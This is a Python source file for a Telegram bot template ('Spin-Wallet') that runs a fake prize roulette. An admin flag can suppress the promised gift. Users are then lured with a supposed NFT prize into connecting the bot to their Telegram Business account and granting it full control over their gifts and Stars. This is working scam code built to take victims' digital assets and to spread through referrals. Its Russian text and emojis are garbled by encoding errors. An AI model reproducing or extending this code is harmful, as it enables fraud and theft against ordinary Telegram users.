from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
import random
import asyncio
from db import Session
from models import WorkerBotUser, WorkerBot, Settings
from sqlalchemy import select

GIFTS = [
    ("üíù", "5170145012310081615"),
    ("üß∏", "5170233102089322756"),
]
SPIN_EMOJIS = ["üíù", "üß∏", "üéÅ", "üåπ", "üéÇ", "üíê", "üöÄ", "üèÜ", "üíç", "üíé", "üçæ"]

NFT_LINKS = [
    "https://t.me/nft/JingleBells-12761",
    "https://t.me/nft/CookieHeart-24314",
    "https://t.me/nft/EvilEye-35690",
    "https://t.me/nft/BDayCandle-106100",
    "https://t.me/nft/XmasStocking-52757",
    "https://t.me/nft/PetSnake-92369",
    "https://t.me/nft/WitchHat-79823",
    "https://t.me/nft/LushBouquet-51759",
    "https://t.me/nft/BDayCandle-249410",
    "https://t.me/nft/WhipCupcake-83450",
    "https://t.me/nft/RestlessJar-73174",
    "https://t.me/nft/LunarSnake-137882",
    "https://t.me/nft/LushBouquet-62832",
]

class BaseTemplate5:
    id = "base_5"
    name = "Spin-Wallet"
    photo_url = "https://i.postimg.cc/xd0pYdCQ/photo-2025-07-29-02-17-57.jpg"
    profile_photo_url = "https://i.postimg.cc/LXQzc9qx/photo-2025-07-29-01-52-26.jpg"     
    help_photo_url = "https://i.postimg.cc/nV54TLfz/photo-2025-07-29-01-52-30.jpg"           
    video_path = None

    after_start = (
        "<b>üéÅ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</b>\n\n"
        "–ó–¥–µ—Å—å —Ç—ã –º–æ–∂–µ—à—å –∫—Ä—É—Ç–∏—Ç—å —Ä—É–ª–µ—Ç–∫—É –∏ –ø–æ–ª—É—á–∞—Ç—å –ø—Ä–∏–∑—ã!\n\n"
        "–í—ã–±–∏—Ä–∞–π –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∏–∂–µ ‚Äî —É–¥–∞—á–∏ üçÄ"
    )

    @classmethod
    def get_reply_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üë§ –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å", callback_data="base5_profile")],
            [InlineKeyboardButton(text="üéÅ –ò—Å–ø—ã—Ç–∞—Ç—å —É–¥–∞—á—É", callback_data="base5_spin")],
            [InlineKeyboardButton(text="üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", callback_data="base5_help")],
        ])

    @classmethod
    def get_receive_markup(cls, nft_name):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"–ü–æ–ª—É—á–∏—Ç—å - {nft_name}", callback_data=f"base5_receive:{nft_name}")]
        ])

    @classmethod
    def get_back_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="base5_back")]
        ])

    @classmethod
    def get_profile_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üç¨ –ü–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω–æ–µ –≤—Ä–∞—â–µ–Ω–∏–µ", callback_data="base5_buy_spin")],
            [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="base5_back")]
        ])

    @classmethod
    def get_profile_back_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="–ù–∞–∑–∞–¥ –≤ –ø—Ä–æ—Ñ–∏–ª—å", callback_data="base5_profile")]
        ])

    @staticmethod
    async def send_gift_to_user(bot, user_id, gift_id, text):
        try:
            await bot.send_gift(user_id=user_id, gift_id=gift_id, text=text)
            return True
        except Exception as e:
            if "BALANCE_TOO_LOW" in str(e):
                return "BALANCE_TOO_LOW"
            print(f"[SEND_GIFT_ERROR]: {repr(e)}")
            return False

    @staticmethod
    async def get_fake_spin_flag(bot, callback):
        async with Session() as session:
            bot_username = (await bot.get_me()).username
            worker_bot = await session.scalar(
                select(WorkerBot).where(WorkerBot.username == bot_username)
            )
            if not worker_bot:
                return False
            admin_id = worker_bot.owner_id
            settings = await session.scalar(
                select(Settings).where(Settings.admin_id == admin_id)
            )
            if settings and getattr(settings, "fake_spin_enabled", False):
                return True
            return False

    @staticmethod
    async def process_callback(callback, bot, chat_id):
        data = callback.data
        bot_username = (await bot.get_me()).username
        telegram_id = callback.from_user.id

        is_premium = getattr(callback.from_user, "is_premium", False)

        # –ü–æ–ª—É—á–∞–µ–º worker_bot
        async with Session() as session:
            worker_bot = await session.scalar(select(WorkerBot).where(WorkerBot.username == bot_username))
            worker_bot_id = worker_bot.id if worker_bot else None

        if data == "base5_profile":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            async with Session() as session:
                user = await session.scalar(select(WorkerBotUser).where(
                    WorkerBotUser.telegram_id == telegram_id,
                    WorkerBotUser.worker_bot_id == worker_bot_id
                ))
                username = user.username if user and user.username else "‚Äî"
                ref_link = f"https://t.me/{bot_username}?start={telegram_id}"

                if not is_premium:
                    premium_text = "‚ùå <b>Telegram Premium:</b> –ù–µ–∞–∫—Ç–∏–≤–Ω–æ"
                    spins_text = "‚ùå <b>–î–æ—Å—Ç—É–ø–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–π:</b> 0"
                else:
                    premium_text = "‚òëÔ∏è <b>Telegram Premium:</b> –ê–∫—Ç–∏–≤–Ω–æ"
                    if user and not getattr(user, "spin_used", False):
                        spins_text = "‚òëÔ∏è <b>–î–æ—Å—Ç—É–ø–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–π:</b> 1"
                    else:
                        spins_text = "‚ùå <b>–î–æ—Å—Ç—É–ø–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–π:</b> 0"

                profile_text = (
                    "<b>üëë –¢–≤–æ–π –ø—Ä–æ—Ñ–∏–ª—å</b>\n\n"
                    f"üÜî <b>ID:</b> <code>{telegram_id}</code>\n"
                    f"üíé <b>–¢–≤–æ–π —Ç—ç–≥:</b> @{username}\n"
                    f"{premium_text}\n"
                    f"{spins_text}\n\n"
                    f"üîó <b>–¢–≤–æ—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:</b>\n"
                    f"<code>{ref_link}</code>\n"
                    "üç¨ <b>–ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π ‚Äî –ø–æ–ª—É—á–∞–π –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –≤—Ä–∞—â–µ–Ω–∏—è!</b>"
                )

                await bot.send_photo(
                    chat_id,
                    photo=BaseTemplate5.profile_photo_url,
                    caption=profile_text,
                    parse_mode="HTML",
                    reply_markup=BaseTemplate5.get_profile_markup()
                )
            return

        if data == "base5_buy_spin":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            buy_text = (
                "–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ –≤—Ä–∞—â–µ–Ω–∏—è –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –±–æ—Ç–∞ –∫ —Å–≤–æ–µ–º—É Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞ –ø–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –Ω–∏–∂–µ:\n\n"
                "1Ô∏è‚É£ <b>–û—Ç–∫—Ä–æ–π—Ç–µ Telegram ‚Üí –ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>\n"
                "2Ô∏è‚É£ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>¬´Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞¬ª</b>\n"
                f"3Ô∏è‚É£ –î–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞ <code>@{bot_username}</code> –≤ –ß–∞—Ç-–±–æ—Ç—ã\n"
                "4Ô∏è‚É£ <b>–í—ã–¥–∞–π—Ç–µ –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏.</b>\n\n"
            )
            await bot.send_message(
                chat_id,
                buy_text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_profile_back_markup()
            )
            return

        if data == "base5_spin":
            if not is_premium:
                await bot.answer_callback_query(
                    callback.id,
                    text="–í—Ä–∞—â–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ: –Ω–∞ –≤–∞—à–µ–º –∞–∫–∫–∞—É–Ω—Ç–µ –Ω–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏ Telegram Premium.\n\n–ü—Ä–∏–≥–ª–∞—Å–∏—Ç–µ –¥—Ä—É–≥–∞ —Å Telegram Premium –∏ –ø–æ–ª—É—á–∏—Ç–µ –≤—Ä–∞—â–µ–Ω–∏–µ!",
                    show_alert=True
                )
                return
            async with Session() as session:
                worker_bot = await session.scalar(select(WorkerBot).where(WorkerBot.username == bot_username))
                user = await session.scalar(select(WorkerBotUser).where(
                    WorkerBotUser.telegram_id == telegram_id,
                    WorkerBotUser.worker_bot_id == worker_bot.id
                ))
                if user and getattr(user, "spin_used", False):
                    await bot.answer_callback_query(
                        callback.id,
                        text="–¢—ã —É–∂–µ –∫—Ä—É—Ç–∏–ª —Ä—É–ª–µ—Ç–∫—É.\n\n–ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π ‚Äî –ø–æ–ª—É—á–∞–π –±–µ—Å–ø–ª–∞—Ç–Ω–æ–µ –≤—Ä–∞—â–µ–Ω–∏–µ!\n\nüîó –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –∏—â–∏ –≤ –ø—Ä–æ—Ñ–∏–ª–µ.",
                        show_alert=True
                    )
                    return
                if user:
                    user.spin_used = True
                    await session.commit()

            is_fake = await BaseTemplate5.get_fake_spin_flag(bot, callback)

            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass

            win_index = random.choice([0, 1])
            gifts_emojis = SPIN_EMOJIS.copy()
            win_emoji, gift_id = GIFTS[win_index]
            arrow_symbol = "‚û°Ô∏è"
            total_positions = len(gifts_emojis)

            path = []
            for _ in range(2):
                for i in range(total_positions):
                    path.append(i)
            curr = path[-1]
            for _ in range(random.randint(3, 7)):
                jump = random.randint(0, total_positions - 1)
                path.append(jump)
                curr = jump
            while curr != win_index:
                curr = (curr + 1) % total_positions
                path.append(curr)

            def make_message(arrow_pos):
                lines = []
                for idx, emoji in enumerate(gifts_emojis):
                    if idx == arrow_pos:
                        lines.append(f"{arrow_symbol} {emoji}")
                    else:
                        lines.append(f"  {emoji}")
                return "<b>üé∞ –ö—Ä—É—Ç–∏–º —Ä—É–ª–µ—Ç–∫—É!</b>\n\n" + "\n".join(lines)

            msg_text = make_message(path[0])
            msg = await bot.send_message(chat_id, msg_text, parse_mode="HTML")

            for idx, curr_idx in enumerate(path):
                txt = make_message(curr_idx)
                await asyncio.sleep(0.13 if idx < len(path) - 7 else 0.42)
                try:
                    await bot.edit_message_text(txt, chat_id=chat_id, message_id=msg.message_id, parse_mode="HTML")
                except Exception:
                    pass

            if not is_fake:
                gift_text = f"{win_emoji} –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –¢—ã –≤—ã–∏–≥—Ä–∞–ª –ø–æ–¥–∞—Ä–æ–∫!"
                await BaseTemplate5.send_gift_to_user(bot, callback.from_user.id, gift_id, gift_text)

            nft_link = random.choice(NFT_LINKS)
            nft_name = nft_link.split("/")[-1]
            text = (
                "<b>‚ÄºÔ∏è –¢–ï–ë–ï –í–´–ü–ê–õ–ê –í–û–ó–ú–û–ñ–ù–û–°–¢–¨ –ü–û–õ–£–ß–ò–¢–¨ –£–ù–ò–ö–ê–õ–¨–ù–´–ô –ü–û–î–ê–†–û–ö NFT ‚ÄºÔ∏è</b>\n"
                f"- <a href=\"{nft_link}\">{nft_name}</a>"
            )
            await bot.send_message(
                chat_id,
                text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_receive_markup(nft_name)
            )
            return

        if data.startswith("base5_receive"):
            parts = data.split(":")
            nft_name = parts[1] if len(parts) > 1 else ""
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            text = (
                f"<b>–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —É–Ω–∏–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ–¥–∞—Ä–∫–∞ {nft_name} –≤—ã–ø–æ–ª–Ω–∏ –ø—Ä–æ—Å—Ç—ã–µ –¥–µ–π—Å—Ç–≤–∏—è:</b>\n\n"
                "1Ô∏è‚É£ <b>–û—Ç–∫—Ä–æ–π—Ç–µ Telegram ‚Üí –ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>\n"
                "2Ô∏è‚É£ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>¬´Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞¬ª</b>\n"
                f"3Ô∏è‚É£ –î–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞ <code>@{bot_username}</code> –≤ –ß–∞—Ç-–±–æ—Ç—ã\n"
                "4Ô∏è‚É£ –í—ã–¥–∞–π—Ç–µ <b>–≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è</b> –≤ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏."
            )
            await bot.send_message(
                chat_id,
                text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_back_markup()
            )
            return

        if data == "base5_help":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            help_text = (
                "<b>üìñ –ö–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ä—É–ª–µ—Ç–∫–æ–π?</b>\n\n"
                "1Ô∏è‚É£ –ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É <b>–ò—Å–ø—ã—Ç–∞—Ç—å —É–¥–∞—á—É</b>\n"
                "2Ô∏è‚É£ –î–æ–∂–¥–∏—Å—å –≤—ã–∏–≥—Ä—ã—à–∞\n"
                "3Ô∏è‚É£ –ü–æ–ª—É—á–∏ –ø–æ–¥–∞—Ä–æ–∫!\n\n"
                "<b>‚ö° –î–ª—è –≤—Ä–∞—â–µ–Ω–∏—è –Ω—É–∂–Ω–∞ –∞–∫—Ç–∏–≤–Ω–∞—è –ø–æ–¥–ø–∏—Å–∫–∞ Telegram Premium!</b>\n\n"
                "–£ —Ç–µ–±—è –µ—Å—Ç—å <b>–æ–¥–Ω–∞ –ø–æ–ø—ã—Ç–∫–∞</b> –¥–ª—è –≤—Ä–∞—â–µ–Ω–∏—è.\n"
                "–ï—Å–ª–∏ —Ö–æ—á–µ—à—å –ø–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–µ –ø–æ–ø—ã—Ç–æ–∫ ‚Äî <b>–ø—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π!</b>\n\n"
                "‚ùóÔ∏è–ï—Å–ª–∏ —É —Ç–µ–±—è –Ω–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏ Telegram Premium, –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏–≥–ª–∞—Å–∏ –¥—Ä—É–≥–∞ —Å Premium ‚Äî –∏ —Ç—ã –ø–æ–ª—É—á–∏—à—å 1 –≤—Ä–∞—â–µ–Ω–∏–µ!\n"
                "–¢–≤–æ—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –≤ –ø—Ä–æ—Ñ–∏–ª–µ."
            )
            await bot.send_photo(
                chat_id,
                photo=BaseTemplate5.help_photo_url,
                caption=help_text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_back_markup()
            )
            return

        if data == "base5_back":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            await bot.send_photo(
                chat_id=chat_id,
                photo=BaseTemplate5.photo_url,
                caption=BaseTemplate5.after_start,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_reply_markup()
            )
            return

        await bot.send_message(chat_id, "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞.")

    @staticmethod
    async def handle_base5_message(message: Message, bot):
        await bot.send_photo(
            chat_id=message.chat.id,
            photo=BaseTemplate5.photo_url,
            caption=BaseTemplate5.after_start,
            parse_mode="HTML",
            reply_markup=BaseTemplate5.get_reply_markup()
        )